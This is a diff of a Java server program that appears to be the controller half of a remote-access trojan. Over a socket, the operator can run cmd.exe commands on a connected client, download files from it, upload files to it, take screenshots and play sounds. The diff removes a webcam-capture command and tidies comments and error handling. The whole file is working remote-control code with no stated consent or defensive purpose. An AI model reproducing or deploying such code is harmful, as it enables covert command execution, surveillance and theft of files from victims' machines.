@@ -6,30 +6,25 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
-import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.Scanner;
 
 public class server {
 	
-	/*
-	 *  Scanner for user input
-	 */
+	// Scanner for user input
 	static Scanner scanIn = new Scanner(System.in);
 
-	/*
-	 *  Server objects for communication
-	 */
+	// Variables for communication
 	static ServerSocket serverSocket;
 	static Socket server;
 	static DataInputStream in;
 	static DataOutputStream out;
 
+	
 	public static void main(String[] args) {
 		
-
-		// Close all connections when Server is shut down with Ctrl-C
+		// Close all connections when Server is shut down without command
 		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
 			public void run() {
 				try {
@@ -37,7 +32,7 @@ public class server {
 					server.close();
 					in.close();
 					out.close();
-				} catch (IOException e) {
+				} catch (Exception e) {
 					e.printStackTrace();
 				}
 
@@ -47,13 +42,14 @@ public class server {
 		
 		connectToClient();
 
-		/*
-		 * Let the user select a command to execute the corresponding function
-		 */
+		// Accept command from user until exit
 		String command;
 
 		while (true) {
+			
+			System.out.println("Ready for command:");
 			command = scanIn.nextLine();
+			
 			switch (command) {
 			case "cmd":
 				cmd();
@@ -67,9 +63,6 @@ public class server {
 			case "screenshot":
 				screenshot();
 				break;
-			case "webcam":
-				webcam();
-				break;
 			case "sound":
 				sound();
 				break;
@@ -80,21 +73,21 @@ public class server {
 				exitClient();
 				break;
 			default:
-				System.out.println("command not found");
+				System.out.println("No such command, you fool!");
 			}
 		}
-
 	}
 	
-
+	
+	// Play sound (.wav)
 	private static void sound() {
-		System.out.println("Enter path to sound file");
+		System.out.println("Enter path to sound file:");
 		String path = scanIn.nextLine();
 		
 		try {
 			out.writeUTF("sound");
 			out.writeUTF(path);
-		} catch (IOException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
 			System.out.println("Error while sending notification!");
 			return;
@@ -103,29 +96,11 @@ public class server {
 	}
 
 
-	private static void webcam() {
-		// Notify client
-		try {
-			out.writeUTF("webcam");
-		} catch (IOException e) {
-			e.printStackTrace();
-			System.out.println("Error while sending notification!");
-			return;
-		}
-		System.out.println("Client received notification!");
-		
-	}
-
-
-	/*
-	 * Order client to save a screenshot
-	 */
+	// Save screenshot as "MMDDHHmm"
 	private static void screenshot() {
-		// Notify client
 		try {
 			out.writeUTF("screenshot");
-		} catch (IOException e) {
-			e.printStackTrace();
+		} catch (Exception e) {
 			System.out.println("Error while sending notification!");
 			return;
 		}
@@ -133,40 +108,34 @@ public class server {
 	}
 
 
-	/*
-	 * Order the client to close itself
-	 */
+	
 	private static void exitClient() {
 		try {
 			out.writeUTF("exit");
-		} catch (IOException e) {
-			e.printStackTrace();
+		} catch (Exception e) {
+			System.out.println("Error while sending notification!");
+			return;
 		}
 
 	}
 
 	
-	/*
-	 * Close connections and exit
-	 */
+	// Exit safely by closing connections
 	private static void safeExit() {
 		try {
 			serverSocket.close();
 			server.close();
 			in.close();
 			out.close();
-		} catch (IOException e) {
-			System.out.println("Error Closing Connections!");
+		} catch (Exception e) {
+			System.out.println("Error closing connections!");
 			System.exit(1);
 		}
-
 		System.exit(0);
 	}
 
 	
-	/*
-	 * Download a file from client
-	 */
+	// Download file from client, save as <fileLen>
 	private static void download() {
 		
 		// Get file Path
@@ -177,8 +146,8 @@ public class server {
 		try {
 			out.writeUTF("send");
 			out.writeUTF(fPath);
-		} catch (IOException e) {
-			e.printStackTrace();
+		} catch (Exception e) {
+			System.out.println("Error sending notification and path!");
 			return;
 		}
 		
@@ -188,8 +157,8 @@ public class server {
 		int fileLen = 0;
 		try {
 			fileLen = in.readInt();
-		} catch (IOException e) {
-			e.printStackTrace();
+		} catch (Exception e) {
+			System.out.println("Error receiving file length!");
 			return;
 		}
 		
@@ -201,9 +170,9 @@ public class server {
 			fos = new FileOutputStream(String.valueOf(fileLen));
 		} catch (FileNotFoundException e) {
 			e.printStackTrace();
+			System.out.println("Error creating new file!");
 			return;
 		}
-		
 		
 		// Download and safe file
 		int read = 0, remaining = fileLen;
@@ -213,42 +182,37 @@ public class server {
 		
 		try {
 			while((read = in.read(buffer, 0, Math.min(buffer.length, remaining))) > 0) {
-				System.out.println(read + " Bytes read");
+				System.out.println(remaining + "Bytes remaining\r");
 				remaining -= read;
 				fos.write(buffer, 0, read);
 			}
 			fos.close();
-		} catch (IOException e) {
-			System.out.println("Error while receiving and writing file!");
+		} catch (Exception e) {
 			e.printStackTrace();
+			System.out.println("Error while receiving and writing file!");
 			return;
 		}
 		
-		System.out.println("File recieved!");
-		
-
+		System.out.println("File recieved!               ");
 	}
 
 	
-	/*
-	 * Upload a file to client
-	 */
+	// Upload file to client and save as <fileLen>
 	private static void upload() {
 		
 		// Notify client
 		try {
 			out.writeUTF("receive");
-		} catch (IOException e1) {
-			e1.printStackTrace();
-			System.out.println("Connection lost!");
+		} catch (Exception e) {
+			System.out.println("Error sending notification!");
 			return;
 		}
 
 		// Get path to file
-		System.out.println("Path to file: ");
+		System.out.println("Enter path to file:");
 		String fPath = scanIn.nextLine();
 
-		// prepare reading from file
+		// Prepare reading from file
 		System.out.println("Prepare reading from file...");
 		File file;
 		FileInputStream fis;
@@ -257,33 +221,33 @@ public class server {
 			file = new File(fPath);
 			fis = new FileInputStream(file);
 			fileLen = (int) file.length();
-		} catch (FileNotFoundException e) {
-			System.out.println("Could not access File!");
+		} catch (Exception e) {
 			e.printStackTrace();
+			System.out.println("Could not access File!");
 			return;
 		}
 		
-		
 		// Send file length, read and upload file
 		System.out.println("Uploading file...");
+		
 		byte[] buffer = new byte[fileLen];
+		
 		try {
 			out.writeInt(fileLen);
 			while (fis.read(buffer) > 0)
 				out.write(buffer);
 			fis.close();
-		} catch (IOException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
-			System.out.println("Connection lost!");
+			System.out.println("Error while uploading file!");
 			return;
 		}
 		
 		System.out.println("File uploaded!");
 	}
 
-	/*
-	 * Execute commands in cmd.exe
-	 */
+
+	// Control cmd.exe
 	private static void cmd() {
 		try {
 			// Notify client
@@ -304,20 +268,19 @@ public class server {
 			}
 			if (attempts == 1000) {
 				System.out.println("Timeout while waiting for Response!");
+				return;
 			}
 			
 			// Display response
 			System.out.println(in.readUTF());
-		} catch (IOException | InterruptedException e) {
+		} catch (Exception e) {
 			System.out.println("Error during transmissions!");
+			e.printStackTrace();
 			return;
 		}
-
 	}
 
-	/*
-	 * Establish connection to Client
-	 */
+	// Establish connection to client
 	private static void connectToClient() {
 
 		try {
@@ -328,12 +291,10 @@ public class server {
 			System.out.println("Connection established!");
 			in = new DataInputStream(server.getInputStream());
 			out = new DataOutputStream(server.getOutputStream());
-		} catch (IOException e) {
-			System.out.println("Connection could not be established!");
+		} catch (Exception e) {
 			e.printStackTrace();
+			System.out.println("Connection could not be established!");
 			System.exit(1);
 		}
-
 	}
-
 }
